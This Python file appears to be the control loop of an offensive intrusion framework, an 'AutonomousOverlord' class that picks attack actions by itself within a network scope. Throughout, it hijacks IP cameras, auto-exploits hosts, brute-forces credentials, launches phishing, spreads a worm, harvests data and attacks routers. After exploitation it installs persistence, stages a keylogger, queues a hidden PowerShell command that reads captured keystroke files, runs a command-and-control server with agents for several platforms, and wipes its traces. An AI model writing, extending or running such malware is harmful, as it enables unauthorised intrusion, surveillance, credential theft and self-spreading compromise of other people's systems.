"""quantum.overlord.autonomous — AutonomousOverlord (camera-first ordering).

STANDING RULE: keep phase 1 (camwar) before phase 2 (service scan) exactly.
"""
from __future__ import annotations

import os
import threading
import time

from quantum.ai.supervisor import AI_Supervisor
from quantum.camwar.brute_v3 import BruteEngineV3, PhishEngine
from quantum.camwar.engine import CAMWAR
from quantum.c2.agents.ghostfang import generate_posix_agent
from quantum.core.env import AGENT, QCLI_DIR, PRIV, local_ip
from quantum.core.grayfish import GRAYFISH
from quantum.core.logging import MitreMapper, log
from quantum.core.opsec import network_aware_jitter
from quantum.overlord.decide import decide
from quantum.overlord.engines import GODSUPREME, UnitedDrake, EpiScribe
from quantum.postexploit.harvest import DataHarvester
from quantum.postexploit.kitlogger import stage_keylogger
from quantum.postexploit.persistx import persistx
from quantum.recon.scan import ReconModule
from quantum.weapons.registry import ExploitOrchestrator


class AutonomousOverlord:
    ACTIONS = ["cam_war", "cam_discover", "cam_control", "recon_scope", "exploit",
               "brute", "phish", "worm", "harvest", "router", "osint",
               "episcribe", "mitre_report", "rest"]

    def __init__(self, scope=None, cycles=0, aggression="balanced", camera_only=False):
        from quantum.core.env import local_scope
        self.scope = scope or local_scope()
        self.aggression = aggression
        self.camera_only = camera_only
        self.ai = AI_Supervisor()
        self.recon = ReconModule()
        self.weapons = ExploitOrchestrator()
        self.brute = BruteEngineV3()
        self.phish = PhishEngine()
        self.harvest = DataHarvester()
        self.epi = EpiScribe()
        self.ud = UnitedDrake()
        self.camwar = CAMWAR
        self.cycles = cycles
        self.state = {"targets": [], "fired": [], "creds": [], "cams": []}
        self.stop = threading.Event()

    def _decide(self):
        return decide(self)

    def post_exploit_auto(self):
        """V3.1: runs after successful exploitation — stealth persistence stage
        (PERSISTX), keylogger staging (KITLOGGER task in queue, delivered on
        next beacon) and secure exfil prep (GRAYFISH interior files)."""
        hits = persistx()
        stage_keylogger()
        for t in self.state["fired"]:
            from quantum.postexploit.killswitch import TASKQ
            TASKQ.setdefault(t, {}).update({"act": "run", "cmd":
                "powershell -w hidden -c Get-ChildItem $env:TEMP\\ -Filter *.klq | "
                "%% { [IO.File]::ReadAllBytes($_.FullName) }"})
        log(f"POST-EXPLOIT auto-stage: persist={hits} keylogger=queued "
            f"targets={len(self.state['fired'])}", "C2")

    def _execute(self, d):
        act, tgt = d.get("action"), d.get("target", "")
        log(f"AUTO decision: {act} target={tgt or '-'} ({d.get('reason')})", "AUTO")
        if act == "cam_war" or act == "cam_discover":
            cidr = tgt if "/" in (tgt or "") else self.scope
            res = self.camwar.pwn_network(cidr) if act == "cam_war" else \
                  {"cams": self.camwar.discover(cidr)}
            self.state["cams"] += res.get("cams", [])
        elif act == "cam_control":
            for c in self.state["cams"] or []:
                if c.get("controlled"):
                    self.camwar.control_cam(c)
                else:
                    self.camwar.attack_cam(c)
        elif act == "recon_scope":
            self.state["targets"] = list(self.recon.scan(self.scope).keys())
        elif act == "exploit" and tgt:
            r = self.weapons.auto_exploit(tgt, force=(self.aggression == "aggressive"))
            if not r.get("skipped"):
                self.state["fired"].append(tgt)
                self.post_exploit_auto()
        elif act == "brute" and tgt:
            self.state["creds"] += self.brute.run({"ip": tgt, "osint": self.state.get("osint", "")})
        elif act == "phish" and tgt:
            self.phish.launch({"target_email": tgt})
        elif act == "worm" and tgt:
            threading.Thread(target=GODSUPREME.hop_from, args=(tgt,), daemon=True).start()
        elif act == "harvest":
            for h in self.state["fired"] or [tgt]:
                if h: self.harvest.harvest_host(h)
        elif act == "router" and tgt:
            self.ud.attack_router(tgt)
        elif act == "osint" and tgt:
            self.recon.osint(tgt)
        elif act == "episcribe" and tgt:
            self.epi.add_selector(tgt); self.epi.watch(duration=60)
        elif act == "mitre_report" or act == "rest":
            pass
        time.sleep(network_aware_jitter(15))

    def run(self):
        from quantum.c2.app import make_c2, keygen
        from quantum.c2.wsgi import run_c2
        log(f"AUTONOMOUS DOMINION: scope {self.scope}, aggression {self.aggression}, "
            f"camera_only={self.camera_only}, CAMERAS ARE THE PRIMARY OBJECTIVE "
            f"(AI={'QBrain fallback' if (AI_Supervisor.ai_dead or os.environ.get('QCLI_NO_AI') == '1') else 'online/local'})", "AUTO")
        if not os.path.exists(PRIV): keygen()
        agents = {"default": (open(AGENT).read() if os.path.exists(AGENT) else "# agent file missing"),
                  "linux":   (open(generate_posix_agent(local_ip())).read()),
                  "mac":     (open(os.path.join(QCLI_DIR, "ghostfang.sh")).read())}
        threading.Thread(target=lambda: run_c2(make_c2(agents)), daemon=True).start()
        n = 0
        try:
            self.state["cams"] = self.camwar.pwn_network(self.scope).get("cams", [])
            while not self.stop.is_set():
                from quantum.postexploit.killswitch import KILLSWITCH
                if KILLSWITCH["on"]:
                    log("AUTONOMOUS: kill-switch engaged — retiring & sealing", "AUTO"); break
                n += 1
                self._execute(self._decide())
                if self.cycles and n >= self.cycles:
                    log(f"AUTONOMOUS: cycle budget ({self.cycles}) reached", "AUTO"); break
        except KeyboardInterrupt:
            log("AUTONOMOUS: operator interrupt — sealing loot", "AUTO")
        except Exception as e:
            log(f"AUTONOMOUS fatal: {e}", "ERR")
        finally:
            from quantum.postexploit.footprint import (footprint_wipe_posix,
                                                        footprint_wipe_windows)
            from quantum.postexploit.killswitch import KILLSWITCH
            if KILLSWITCH["on"]:
                footprint_wipe_windows() if os.name == "nt" else footprint_wipe_posix()
            GRAYFISH.seal_dir()
            MitreMapper().map_audit()
            log(f"AUTONOMOUS: paused after {n} cycles — {len(self.state['cams'])} cameras touched, "
                f"{len(self.state['fired'])} fired, {len(self.state['creds'])} creds", "AUTO")
